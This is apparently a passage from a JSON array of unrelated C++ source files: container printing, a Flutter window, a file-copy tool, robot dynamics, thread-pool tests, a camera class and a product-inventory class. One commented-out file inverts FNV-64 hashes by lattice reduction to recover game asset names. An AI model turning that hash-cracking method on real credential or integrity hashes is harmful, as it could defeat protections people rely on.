&command);\n\t\t}\n\t\t__except (EXCEPTION_EXECUTE_HANDLER)\n\t\t{\n\t\t\treturn false;\n\t\t}\n\t\treturn command.result;\n\t}\n}",
    "#include \"../include/container_view.h\"\n#include <iostream>\n#include <vector>\n#include <deque>\n#include <list>\n#include <set>\n#include <map>\n#include <unordered_set>\n#include <unordered_map>\n#include <array>\n#include <tuple>\n#include <forward_list>\n\nint main() {\n    // Pair\n    std::pair<int, double> p = {1, 3.14};\n    std::cout << \"Pair: \" << p << std::endl;\n\n    // Tuple\n    std::tuple<int, char, double> t = {1, 'a', 2.3};\n    std::cout << \"Tuple: \" << t << std::endl;\n\n    // Array\n    std::array<int, 3> arr = {1, 2, 3};\n    std::cout << \"Array: \" << arr << std::endl;\n\n    // Deque\n    std::deque<double> dq = {1.1, 2.2, 3.3};\n    std::cout << \"Deque: \" << dq << std::endl;\n\n    // Forward List\n    std::forward_list<int> fl = {1, 2, 3};\n    std::cout << \"Forward List: \" << fl << std::endl;\n\n    // Initializer list (note: we cannot print directly, used only for example)\n    std::initializer_list<int> il = {1, 2, 3};\n\n    // List\n    std::list<int> lst = {1, 2, 3};\n    std::cout << \"List: \" << lst << std::endl;\n\n    // Vector\n    std::vector<std::string> vec = {\"hello\", \"world\"};\n    std::cout << \"Vector: \" << vec << std::endl;\n\n    // Set\n    std::set<std::string> set = {\"apple\", \"banana\", \"cherry\"};\n    std::cout << \"Set: \" << set << std::endl;\n\n    // Multiset\n    std::multiset<int> mset = {4, 5, 4, 1};\n    std::cout << \"Multiset: \" << mset << std::endl;\n\n    // Unordered Set\n    std::unordered_set<int> uset = {4, 5, 6, 7};\n    std::cout << \"Unordered Set: \" << uset << std::endl;\n\n    // Unordered Multiset\n    std::unordered_multiset<int> umset = {4, 5, 6, 6};\n    std::cout << \"Unordered Multiset: \" << umset << std::endl;\n\n    // Map\n    std::map<char, int> map = {{'a', 1}, {'b', 2}};\n    std::cout << \"Map: \" << map << std::endl;\n\n    // Multimap\n    std::multimap<char, int> mmap = {{'a', 1}, {'a', 2}};\n    std::cout << \"Multimap: \" << mmap << std::endl;\n\n    // Unordered Map\n    std::unordered_map<char, int> umap = {{'c', 3}, {'b', 2}};\n    std::cout << \"Unordered Map: \" << umap << std::endl;\n\n    // Unordered Multimap\n    std::unordered_multimap<char, int> ummap = {{'c', 3}, {'c', 4}};\n    std::cout << \"Unordered Multimap: \" << ummap << std::endl;\n\n    return 0;\n}\n",
    "/*\n*\n* This is just an old file I had for testing, it still has some code I want to port for multitheading\n* so it will not yet be deleted\n*\n*/\n\n\n/*\n#include \"fplll.h\"\n#include <iomanip>\n\n// changes a lot depending on what you're trying to crack\nconstexpr uint64_t OFFSET_BASIS = 0x79D6530B0BB9B5D1;\n\n// These are the only two primes COD uses (as far as I know)\nconstexpr uint64_t PRIME = 0x10000000233; // will crack 8 char plaintext with around 54% accuracy\n// constexpr uint64_t PRIME = 0x100000001B3; // will crack 8 char plaintext with around 93% accuracy\n\n// may occasionally change to 63\nconstexpr uint32_t BIT_LEN = 64;\nstatic_assert(BIT_LEN <= 64, \"The hard maximum on the BIT_LEN value is 64\");\n\nuint64_t fnv64(const char* string) {\n    uint64_t hash = OFFSET_BASIS;\n    constexpr uint64_t prime = PRIME;\n    for (int i = 0; string[i] && string[i] != '\\n'; ++i) {\n        char cur = string[i];\n        if ((unsigned char)(cur - 'A') <= 25)\n            cur |= 0x20;\n\n        if (cur == '\\\\')\n            cur = '/';\n\n        hash ^= cur;\n        hash *= prime;\n    }\n\n    if constexpr (BIT_LEN != 64) {\n        return hash % (1ULL << BIT_LEN);\n    } else {\n        return hash;\n    }\n}\n\nuint64_t fnv64(const string& string) {\n    uint64_t hash = OFFSET_BASIS;\n    constexpr uint64_t prime = PRIME;\n    for (const char& chr : string) {\n        char cur = chr;\n        if ((unsigned char)(cur - 'A') <= 25)\n            cur |= 0x20;\n\n        if (cur == '\\\\')\n            cur = '/';\n\n        hash ^= cur;\n        hash *= prime;\n    }\n\n    if constexpr (BIT_LEN != 64) {\n        return hash % (1ULL << BIT_LEN);\n    } else {\n        return hash;\n    }\n}\n\nstd::tuple<Z_NR<mpz_t>, Z_NR<mpz_t>, Z_NR<mpz_t>>\ngcd_extended(Z_NR<mpz_t> a, Z_NR<mpz_t> b) {\n    if (a == 0) {\n        Z_NR<mpz_t> ra, rb;\n        mpz_set_ui(ra.get_data(), 0UL);\n        mpz_set_ui(rb.get_data(), 1UL);\n        return make_tuple(b, ra, rb);\n    }\n\n    Z_NR<mpz_t> tmp_b, x;\n    tmp_b.mod(b, a);\n    auto [gcd, x1, y1] = gcd_extended(tmp_b, a);\n    mpz_div(b.get_data(), b.get_data(), a.get_data());\n    b.mul(b, x1);\n    x.sub(y1, b);\n    return make_tuple(gcd, x, x1);\n}\n\ntemplate <unsigned long long prime, uint32_t exp>\nuint64_t inverse() {\n    static once_flag flag{};\n    static uint64_t result;\n    call_once(flag, [&]() {\n        Z_NR<mpz_t> mpz_exp, mpz_prime, tmp;\n        mpz_ui_pow_ui(mpz_exp.get_data(), 2U, exp);\n        mpz_set_ui(mpz_prime.get_data(), prime);\n\n        auto ret = gcd_extended(mpz_prime, mpz_exp);\n        tmp.mod(std::get<1>(ret), mpz_exp);\n        result = mpz_get_ui(tmp.get_data());\n        if constexpr (exp != 64) {\n            result %= 1ULL << exp;\n        }\n    });\n\n    return result;\n}\n\nvector<string>& product(const string_view& chars, int repeat) {\n    static unordered_map<int, vector<string>> cache;\n    \n    auto it = cache.find(repeat);\n    if (it != cache.end())\n        return it->second;\n    \n    vector<string> result;\n    function<void(int, string)> generate = [&](int depth, string current) {\n        if (depth == 0) {\n            result.push_back(current);\n            return;\n        }\n        \n        for (const char c : chars)\n            generate(depth - 1, current + c);\n    };\n    \n    generate(repeat, \"\");\n    cache[repeat] = result;    \n    return cache[repeat];\n}\n\ninline Z_NR<mpz_t> pow(const Z_NR<mpz_t>& base, unsigned int exponent) {\n    Z_NR<mpz_t> result;\n    mpz_pow_ui(result.get_data(), base.get_data(), exponent);\n    return result;\n}\n\nbool solve(\n    string& result,\n    const uint64_t target,\n    const uint32_t expected_len,\n    const uint32_t brute = 0,\n    const string& prefix = \"\",\n    const string& suffix = \"\"\n) {\n    Z_NR<mpz_t> MOD, p;\n    mpz_ui_pow_ui(MOD.get_data(), 2U, BIT_LEN); // 2 ** BIT_LEN\n    mpz_set_ui(p.get_data(), PRIME);\n\n    // change according to whatever youre working with\n    const string valid_charset = valid_func;\n\n    const uint32_t nn = expected_len - brute - prefix.size() - suffix.size();\n    const uint32_t dim = nn + 2;\n\n    uint64_t P = 1;\n    for (int i = 0; i < nn; ++i)\n        P *= PRIME;\n    \n    if constexpr (BIT_LEN != 64) {\n        P %= 1ULL << BIT_LEN;\n    }\n\n    Z_NR<mpz_t> start;\n    mpz_set_ui(start.get_data(), 1ULL << 12); // 2 ** 12\n\n    ZZ_mat<mpz_t> Q(dim, dim);\n    Q(0, 0) = start;\n    for (int i = 1; i < dim - 1; ++i)\n        Q(i, i) = 1ULL << 4; // 2 ** 4\n    Q(dim - 1, dim - 1) = 1ULL << 10; // 2 ** 10\n\n    // identity matrix but with an extra column on the left and extra row on the bottom\n    ZZ_mat<mpz_t> _M(dim, dim);\n    for (int i = 0; i <= nn; ++i)\n        _M(i, i+1) = 1;\n\n    // fill in extra column on the left\n    // (except second to last val)\n    for (int i = 0; i < nn; ++i)\n        _M(i, 0) = pow(p, nn - i);\n    _M(dim - 1, 0) = MOD;\n\n    uint64_t ntarget = target;\n    for (int i = suffix.size() - 1; i >= 0; --i) {\n        ntarget *= inverse<PRIME, BIT_LEN>();\n        ntarget ^= suffix.at(i);\n    }\n\n    string ret = \"\";\n    if constexpr (BIT_LEN != 64) {\n   ",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"../include/copyOperator.h\"\n\n/**\n * @brief \u68c0\u67e5\u90a3\u4e9b\u65e0\u6548\u7684\u547d\u4ee4\u884c\u53c2\u6570\u8f93\u5165\uff0c\n *        \u5728 argc \u4e3a 1\uff08\u6ca1\u6709\u53c2\u6570\uff09\u4ee5\u53ca\u5927\u4e8e 3\uff08\u53c2\u6570\u8fc7\u591a\uff09\u65f6\uff0c\u8fd4\u56de false\n * \n * @param __argCount    \u53c2\u6570\u6570\u91cf\n * \n * @return \u547d\u4ee4\u884c\u53c2\u6570\u6570\u91cf\u662f\u5426\u5408\u7406\n*/\ninline bool checkInvalidArgc(const int __argCount) { return (__argCount == 1) || (__argCount > 3); };\n\nint main(int argc, char const *argv[])\n{\n    system(clearCommand);\n\n    FileCopyOperator FileCopyOp;\n\n    if (checkInvalidArgc(argc)) { ERROR_LOG(\"Not or invalid argument!\\n\"); FileCopyOp.showHelp(); }\n\n    else if ((std::strcmp(argv[1], \"--help\") == 0) && argc == 2) { FileCopyOp.showHelp(); }\n\n    else if ((std::strcmp(argv[1], \"--version\") == 0) && argc == 2) { FileCopyOp.showVersion(); }\n\n    else if (argc == 3) \n    {   \n        int64_t costTime = TIMER( FileCopyOp.copyFile(argv[1], argv[2]) );\n\n        if (costTime >= 1500) { ERROR_LOG(\"Copy cost [\" + std::to_string(costTime) + \"] ms.\\n\"); }\n        else\n        {\n            CORRECT_LOG(\"Copy cost [\" + std::to_string(costTime) + \"] ms.\\n\");\n        }\n\n        printSplitLine(45, '-');\n    }\n    else \n    {\n        ERROR_LOG(\"Invalid argument!\\n\"); \n        FileCopyOp.showHelp();\n    }\n\n    DONE\n    return EXIT_SUCCESS;\n}\n",
    "#include \"srbd.hpp\"\n\n#include <proxsuite/proxqp/dense/dense.hpp>\n\nnamespace srbd {\n    using qp_t = proxsuite::proxqp::dense::QP<double>;\n    using qp_mat_t = proxsuite::proxqp::dense::Mat<double>;\n    using qp_vec_t = proxsuite::proxqp::dense::Vec<double>;\n\n    SingleRigidBodyDynamics::SingleRigidBodyDynamics(const SingleRigidBodyDynamics& other)\n    {\n        // TO-DO: This is not the best way to handle this!! BUT should be okay for now..\n        operator=(other);\n    }\n\n    SingleRigidBodyDynamics& SingleRigidBodyDynamics::operator=(const SingleRigidBodyDynamics& other)\n    {\n        // COM state\n        _base_position = other._base_position;\n        _base_vel = other._base_vel;\n        _base_orientation = other._base_orientation;\n        _base_angular_vel = other._base_angular_vel;\n\n        // Feet state\n        _feet_positions = other._feet_positions;\n        _feet_phases = other._feet_phases;\n\n        // Static ref poses/bounds\n        _feet_ref_positions = other._feet_ref_positions;\n        _feet_min_bounds = other._feet_min_bounds;\n        _feet_max_bounds = other._feet_max_bounds;\n\n        // Phase Handler\n        _phase_handler = std::move(other._phase_handler->clone());\n\n        // Terrain\n        _terrain = std::move(other._terrain->clone());\n\n        // General state\n        _mass = other._mass;\n        _inertia = other._inertia;\n        _inertia_inv = other._inertia_inv;\n\n        // Global variables\n        _dt = other._dt;\n        _g = other._g;\n        _gravity = other._gravity;\n\n        // Helper variables\n        _last_qp_result_valid = other._last_qp_result_valid;\n\n        return *this;\n    }\n\n    void SingleRigidBodyDynamics::set_sim_data(double dt, double gravity)\n    {\n        _dt = dt;\n        _g = std::abs(gravity);\n        _gravity = Vec3d(0, 0, -_g);\n    }\n\n    void SingleRigidBodyDynamics::set_inertial_data(double mass, const RotMat& inertia)\n    {\n        _mass = mass;\n        _inertia = inertia;\n        _inertia_inv = inertia.inverse();\n    }\n\n    void SingleRigidBodyDynamics::set_feet_data(const std::vector<Vec3d>& feet_ref_positions, const std::vector<Vec3d>& feet_min_bounds, const std::vector<Vec3d>& feet_max_bounds)\n    {\n        assert((_feet_ref_positions.size() == _feet_min_bounds.size() == _feet_max_bounds.size()) && \"Not consistent number of feet!\");\n        _feet_ref_positions = feet_ref_positions;\n        _feet_min_bounds = feet_min_bounds;\n        _feet_max_bounds = feet_max_bounds;\n    }\n\n    void SingleRigidBodyDynamics::set_data(const Vec3d& base_position, const Vec3d& base_velocity, const RotMat& base_orientation, const Vec3d& base_angular_velocity, const std::vector<Vec3d>& feet_positions, const std::vector<size_t>& feet_phases)\n    {\n        // Base-related\n        _base_position = base_position;\n        _base_vel = base_velocity;\n        _base_orientation = base_orientation;\n        _base_angular_vel = base_angular_velocity;\n\n        // Feet-related\n        assert(feet_positions.size() == _feet_ref_positions.size() && feet_phases.size() == _feet_ref_positions.size() && \"Wrong number of feet!\");\n        _feet_positions = feet_positions;\n        _feet_phases = feet_phases;\n    }\n\n    void SingleRigidBodyDynamics::set_base_position(const Vec3d& pos) { _base_position = pos; }\n\n    void SingleRigidBodyDynamics::set_base_velocity(const Vec3d& vel) { _base_vel = vel; }\n\n    void SingleRigidBodyDynamics::set_base_orientation(const RotMat& rot) { _base_orientation = rot; }\n\n    void SingleRigidBodyDynamics::set_base_angular_velocity(const Vec3d& ang_vel) { _base_angular_vel = ang_vel; }\n\n    void SingleRigidBodyDynamics::set_feet_positions(const std::vector<Vec3d>& feet_positions)\n    {\n        assert(feet_positions.size() == _feet_ref_positions.size() && \"Wrong number of feet!\");\n        _feet_positions = feet_positions;\n    }\n\n    void SingleRigidBodyDynamics::set_feet_phases(const std::vector<size_t>& feet_phases)\n    {\n        assert(feet_phases.size() == _feet_ref_positions.size() && \"Wrong number of feet!\");\n        _feet_phases = feet_phases;\n    }\n\n    std::tuple<Matrix, Matrix, Vector> SingleRigidBodyDynamics::linearize() const\n    {\n        const size_t n_dim = 9;\n        const size_t n_feet = _feet_ref_positions.size();\n        const size_t m_dim = n_feet * 3;\n\n        Matrix L_c = skew(_base_angular_vel) * (_inertia - skew(_inertia * _base_angular_vel)); // optimal gain\n        // State Space Model X_n+1 = A*X_n + B*U_n\n        // Define A Matrix\n        Matrix A = Matrix::Zero(n_dim, n_dim);\n        // Block of size (p,q), starting at (i,j)\tmatri_block(i,j,p,q); matri_block<p,q>(i,j);\n        A.block(0, 0, 3, 3) = Matrix::Identity(3, 3);\n        A.block(0, 3, 3, 3) = Matrix::Identity(3, 3) * _dt;\n        A.block(3, 3, 3, 3) = Matrix::Identity(3, 3);\n        A.block(6, 6, 3, 3) = Matrix::Identity(3, 3) - _dt * _inertia_inv * L_c;\n\n        // Define B Matrix\n        Matrix B = Matrix::Zero(n_dim, m_dim);\n        B.block(0, 0, 3, 3 * n_feet) = kron((((0.5 * _",
    "#include \"thread_pool.h\"\n\n#include <gtest/gtest.h>\n\nnamespace mca {\nnamespace test {\nTEST(TestThreadPool, defaultConstructor) {\n    ThreadPool tp;\n    ASSERT_EQ(tp.size(), (size_t)5);\n    ASSERT_EQ(tp.getTaskNum(), (size_t)0);\n}\n\nTEST(TestThreadPool, setThreadNum) {\n    ThreadPool tp(3);\n    ASSERT_EQ(tp.size(), (size_t)3);\n    ASSERT_EQ(tp.getTaskNum(), (size_t)0);\n    tp.resize(5);\n    ASSERT_EQ(tp.size(), (size_t)5);\n    ASSERT_EQ(tp.getTaskNum(), (size_t)0);\n    tp.resize(2);\n    ASSERT_EQ(tp.size(), (size_t)2);\n    ASSERT_EQ(tp.getTaskNum(), (size_t)0);\n}\n\nTEST(TestThreadPool, addTask) {\n    ThreadPool tp(0);\n    size_t taskNum = 10;\n    std::vector<std::future<size_t>> resultVector;\n    for (size_t i = 0; i < taskNum; i++) {\n        resultVector.emplace_back(\n            tp.addTask([](size_t a, size_t b) -> size_t { return a + b; }, (size_t)2, (size_t)3));\n    }\n    ASSERT_EQ(tp.getTaskNum(), taskNum);\n    tp.resize(5);\n    for (size_t i = 0; i < taskNum; i++) {\n        ASSERT_EQ(resultVector[i].get(), (size_t)2 + (size_t)3);\n    }\n}\n\n// this test will check if the running task will be executed normally\n// and if the other tasks are removed\nTEST(TestThreadPool, clear) {\n    using namespace std::chrono_literals;\n    ThreadPool tp(1);\n    std::vector<std::future<size_t>> resultVector;\n    size_t taskNum = 10;\n    for (size_t i = 0; i < taskNum; i++) {\n        resultVector.emplace_back(tp.addTask([]() -> size_t {\n            std::this_thread::sleep_for(500ms);\n            return 233;\n        }));\n    }\n    // this is to make sure the first task is running\n    std::this_thread::sleep_for(50ms);\n    tp.clear();\n    EXPECT_EQ(resultVector[0].get(), (size_t)233);\n    ASSERT_EQ(tp.getTaskNum(), size_t(0));\n    ASSERT_EQ(tp.size(), size_t(0));\n}\n\n}  // namespace test\n}  // namespace mca\n",
    "//\n// Created by ivan on 2024/5/4.\n//\n\n#include \"Camera.hpp\"\n#include <utility>\n#include <cmath>\n#include <spdlog/spdlog.h>\n#define GLM_ENABLE_EXPERIMENTAL\n#include <glm/gtx/vector_angle.hpp>\n#include <glm/gtc/matrix_transform.hpp>\n#include <iostream>\n\nnamespace lgl {\n\nenum class MouseButton {\n    None,\n    Left,\n    Right,\n};\n\nstatic Camera* gCamera = nullptr;\nstatic MouseButton gMouseButton = MouseButton::None;\nstatic std::pair gLastCursorPosOpt{false, std::make_pair(0., 0.)};\n\nstatic void cursor_pos_callback(GLFWwindow *widow, double xpos, double ypos);\nstatic void mouse_button_callback(GLFWwindow *window, int button, int action, int mods);\n\nCamera::Camera(GL *gl) : m_cameraPos_(0.f, 0.f, 3.f), m_cameraUp_(0.f, 1.f, 0.f), m_lookingAt_(0.f, 0.f, 0.f), m_rotateAxis_(0.f, 1.f, 0.f){\n    if (!gl) {\n        spdlog::error(\"GL in Camera is null!\");\n        assert(false);\n    }\n\n    glfwSetCursorPosCallback(gl->get_window(), cursor_pos_callback);\n    glfwSetMouseButtonCallback(gl->get_window(), mouse_button_callback);\n\n    context();\n}\n\nvoid Camera::context() {\n    gCamera = this;\n}\n\nglm::mat4 Camera::view() const {\n    return glm::lookAt(m_cameraPos_, m_lookingAt_, m_cameraUp_);\n}\n\nstatic glm::vec3 from_yaw_pitch(double yaw, double pitch) {\n    yaw = float(glm::radians(yaw));\n    pitch = float(glm::radians(pitch));\n    return {\n        std::cos(pitch) * std::sin(yaw),\n        std::sin(pitch),\n        std::cos(pitch) * std::cos(yaw)\n    };\n}\n\nvoid Camera::inc_yaw(double angle) {\n    m_yaw_ += angle;\n\n    auto dist = glm::length(m_cameraPos_ - m_lookingAt_);\n    m_cameraPos_ = dist * from_yaw_pitch(m_yaw_, m_pitch_) + m_lookingAt_;\n    m_cameraUp_ = glm::rotate(glm::mat4(1.f), glm::radians(float(angle)), m_rotateAxis_) * glm::vec4(m_cameraUp_, 1.f);\n\n    spdlog::debug(\"yaw: {}\", m_yaw_);\n}\n\nvoid Camera::inc_pitch(double angle) {\n    m_pitch_ += angle;\n    // FIXME:\n    m_pitch_ = std::clamp(m_pitch_, -89., 89.);\n\n    auto dist = glm::length(m_cameraPos_ - m_lookingAt_);\n\n    auto frontDirection = glm::normalize(m_lookingAt_ - m_cameraPos_);\n    auto upDirection = glm::normalize(m_cameraUp_);\n    auto rightDirection = glm::normalize(glm::cross(frontDirection, upDirection));\n    spdlog::debug(\"1 angle: {} {} {}\", glm::angle(frontDirection, upDirection), glm::angle(upDirection, rightDirection), glm::angle(frontDirection, rightDirection));\n\n    m_cameraPos_ = dist * from_yaw_pitch(m_yaw_, m_pitch_) + m_lookingAt_;\n    frontDirection = glm::normalize(m_lookingAt_ - m_cameraPos_);\n    m_cameraUp_ = glm::cross(rightDirection, frontDirection);\n\n    frontDirection = glm::normalize(m_lookingAt_ - m_cameraPos_);\n    upDirection = glm::normalize(m_cameraUp_);\n    spdlog::debug(\"angle: {} {} {}\", glm::angle(frontDirection, upDirection), glm::angle(upDirection, rightDirection), glm::angle(frontDirection, rightDirection));\n\n    spdlog::debug(\"pitch: {}\", m_pitch_);\n}\n\nCamera::~Camera() {\n\n}\n\nvoid cursor_pos_callback(GLFWwindow *widow, double xpos, double ypos) {\n    if (!gCamera) return;\n\n    std::pair<double, double> delta;\n    if (MouseButton::None != gMouseButton) {\n        if (!gLastCursorPosOpt.first) {\n            gLastCursorPosOpt.first = true;\n            gLastCursorPosOpt.second = {xpos, ypos};\n            return;\n        }\n        delta.first = xpos - gLastCursorPosOpt.second.first;\n        delta.second = ypos - gLastCursorPosOpt.second.second;\n        gLastCursorPosOpt.second = {xpos, ypos};\n    } else {\n        gLastCursorPosOpt.first = false;\n        return;\n    }\n\n    if (MouseButton::Left == gMouseButton) {\n        gCamera->inc_yaw(-delta.first);\n        gCamera->inc_pitch(delta.second);\n    } else if (MouseButton::Right == gMouseButton) {\n        spdlog::info(\"right {} {}\", delta.first, delta.second);\n    }\n}\n\nvoid mouse_button_callback(GLFWwindow *window, int button, int action, int mods) {\n    if (!gCamera) return;\n    if (GLFW_MOUSE_BUTTON_LEFT == button && GLFW_PRESS == action) {\n        gMouseButton = MouseButton::Left;\n    }\n    if (GLFW_MOUSE_BUTTON_RIGHT == button && GLFW_PRESS == action) {\n        gMouseButton = MouseButton::Right;\n    }\n    if (GLFW_RELEASE == action) {\n        gMouseButton = MouseButton::None;\n    }\n}\n\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n#include <map>\r\n#include <algorithm>\r\n#include <stdexcept>\r\n#include <unordered_map>\r\n\r\nusing namespace std;\r\n\r\n// Class c\u01a1 b\u1ea3n cho S\u1eefa\r\nclass Sua {\r\nprotected:\r\n    std::string maHang;\r\n    std::string tenHang;\r\n    std::string ngaySanXuat;\r\n    std::string ngayHetHan;\r\n    std::string noiSanXuat;\r\n    int donGiaNhap;\r\n    int donGiaBan;\r\n\r\npublic:\r\n    // Constructor m\u1eb7c \u0111\u1ecbnh\r\n    Sua() : maHang(\"\"), tenHang(\"\"), ngaySanXuat(\"\"), ngayHetHan(\"\"), noiSanXuat(\"\"), donGiaNhap(0), donGiaBan(0) {}\r\n\r\n    // Constructor v\u1edbi tham s\u1ed1\r\n    Sua(const std::string& ma, const std::string& ten, const std::string& nsx, const std::string& hsd, const std::string& noiSX, int dgn, int dgb)\r\n        : maHang(ma), tenHang(ten), ngaySanXuat(nsx), ngayHetHan(hsd), noiSanXuat(noiSX), donGiaNhap(dgn), donGiaBan(dgb) {}\r\n\r\n    // Getter v\u00e0 Setter cho c\u00e1c thu\u1ed9c t\u00ednh\r\n    std::string getMaHang() const { return maHang; }\r\n    void setMaHang(const std::string& ma) { maHang = ma; }\r\n    std::string getTenHang() const { return tenHang; }\r\n    void setTenHang(const std::string& ten) { tenHang = ten; }\r\n    std::string getNgaySanXuat() const { return ngaySanXuat; }\r\n    void setNgaySanXuat(const std::string& nsx) { ngaySanXuat = nsx; }\r\n    std::string getNgayHetHan() const { return ngayHetHan; }\r\n    void setNgayHetHan(const std::string& hsd) { ngayHetHan = hsd; }\r\n    std::string getNoiSanXuat() const { return noiSanXuat; }\r\n    void setNoiSanXuat(const std::string& noiSX) { noiSanXuat = noiSX; }\r\n    int getDonGiaNhap() const { return donGiaNhap; }\r\n    void setDonGiaNhap(int value) {\r\n        if (value < 0) {\r\n            throw std::invalid_argument(\"\u0110\u01a1n gi\u00e1 nh\u1eadp kh\u00f4ng \u0111\u01b0\u1ee3c \u00e2m\");\r\n        }\r\n        donGiaNhap = value;\r\n    }\r\n    int getDonGiaBan() const { return donGiaBan; }\r\n    void setDonGiaBan(int value) {\r\n        if (value < 0) {\r\n            throw std::invalid_argument(\"\u0110\u01a1n gi\u00e1 b\u00e1n kh\u00f4ng \u0111\u01b0\u1ee3c \u00e2m\");\r\n        }\r\n        donGiaBan = value;\r\n    }\r\n\r\n    // H\u00e0m nh\u1eadp th\u00f4ng tin t\u1eeb b\u00e0n ph\u00edm\r\n    void nhapThongTin() {\r\n        cout << \"Nhap ma hang: \";\r\n        std::getline(cin, maHang);\r\n        cout << \"Nhap ten hang: \";\r\n        std::getline(cin, tenHang);\r\n        cout << \"Nhap ngay san xuat (YYYY-MM-DD): \";\r\n        std::getline(cin, ngaySanXuat);\r\n        cout << \"Nhap ngay het han (YYYY-MM-DD): \";\r\n        std::getline(cin, ngayHetHan);\r\n        cout << \"Nhap noi san xuat: \";\r\n        std::getline(cin, noiSanXuat);\r\n        cout << \"Nhap don gia nhap: \";\r\n        cin >> donGiaNhap;\r\n        cout << \"Nhap don gia ban: \";\r\n        cin >> donGiaBan;\r\n        cin.ignore();\r\n    }\r\n\r\n    // H\u00e0m xu\u1ea5t th\u00f4ng tin\r\n    void xuatThongTin() const {\r\n        cout << \"Ma hang: \" << maHang << std::endl;\r\n        cout << \"Ten hang: \" << tenHang << std::endl;\r\n        cout << \"Ngay san xuat: \" << ngaySanXuat << std::endl;\r\n        cout << \"Ngay het han: \" << ngayHetHan << std::endl;\r\n        cout << \"Noi san xuat: \" << noiSanXuat << std::endl;\r\n        cout << \"Don gia nhap: \" << donGiaNhap << std::endl;\r\n        cout << \"Don gia ban: \" << donGiaBan << std::endl;\r\n    }\r\n};\r\n\r\n// Class S\u1eefa B\u1ed9t k\u1ebf th\u1eeba t\u1eeb S\u1eefa\r\nclass SuaBot : public Sua {\r\nprivate:\r\n    int trongLuong; // Tr\u1ecdng l\u01b0\u1ee3ng (g)\r\n    // Quy c\u00e1ch \u0111\u00f3ng g\u00f3i: m\u1ed7i th\u00f9ng 6 lon\r\n\r\npublic:\r\n    // Constructor m\u1eb7c \u0111\u1ecbnh\r\n    SuaBot() : Sua(), trongLuong(0) {}\r\n\r\n    // Constructor v\u1edbi tham s\u1ed1\r\n    SuaBot(const std::string& ma, const std::string& ten, const std::string& nsx, const std::string& hsd, const std::string& noiSX, int dgn, int dgb, int tl)\r\n        : Sua(ma, ten, nsx, hsd, noiSX, dgn, dgb), trongLuong(tl) {}\r\n\r\n    // Getter v\u00e0 Setter cho trongLuong\r\n    int getTrongLuong() const { return trongLuong; }\r\n    void setTrongLuong(int tl) {\r\n        if (tl < 0) {\r\n            throw std::invalid_argument(\"Tr\u1ecdng l\u01b0\u1ee3ng kh\u00f4ng \u0111\u01b0\u1ee3c \u00e2m\");\r\n        }\r\n        trongLuong = tl;\r\n    }\r\n\r\n    // H\u00e0m nh\u1eadp th\u00f4ng tin s\u1eefa b\u1ed9t\r\n    void nhapThongTin() {\r\n        Sua::nhapThongTin(); // G\u1ecdi h\u00e0m nh\u1eadp th\u00f4ng tin t\u1eeb class c\u01a1 s\u1edf\r\n        cout << \"Nhap trong luong (g): \";\r\n        cin >> trongLuong;\r\n        cin.ignore(); \r\n    }\r\n\r\n    // H\u00e0m xu\u1ea5t th\u00f4ng tin s\u1eefa b\u1ed9t\r\n    void xuatThongTin() const {\r\n        Sua::xuatThongTin(); // G\u1ecdi h\u00e0m xu\u1ea5t th\u00f4ng tin t\u1eeb class c\u01a1 s\u1edf\r\n        cout << \"Trong luong: \" << trongLuong << \" g\" << std::endl;\r\n    }\r\n};\r\n\r\n// Class S\u1eefa Pha S\u1eb5n k\u1ebf th\u1eeba t\u1eeb S\u1eefa\r\nclass SuaPhaSan : public Sua {\r\nprivate:\r\n    int dungTich; // Dung t\u00edch (ml)\r\n    // Quy c\u00e1ch \u0111\u00f3ng g\u00f3i: m\u1ed7i th\u00f9ng 48 h\u1ed9p\r\n\r\npublic:\r\n    // Constructor m\u1eb7c \u0111\u1ecbnh\r\n    SuaPhaSan() : Sua(), dungTich(0) {}\r\n\r\n    // Constructor v\u1edbi tham s\u1ed1\r\n    SuaPhaSan(const std::string& ma, const std::string& ten, const std::string& nsx, const std::string& hsd, const std::string& noiSX, int dgn, int dgb, int dt)\r\n        : Sua(ma, ten, nsx, hsd, noiSX, dgn, dgb), dungTich(dt) {}\r\n\r\n    // Getter v\u00e0 Setter cho dungTich\r\n    int getDungTich() const { return dungTich; }\r\n    void setDungTich(int",
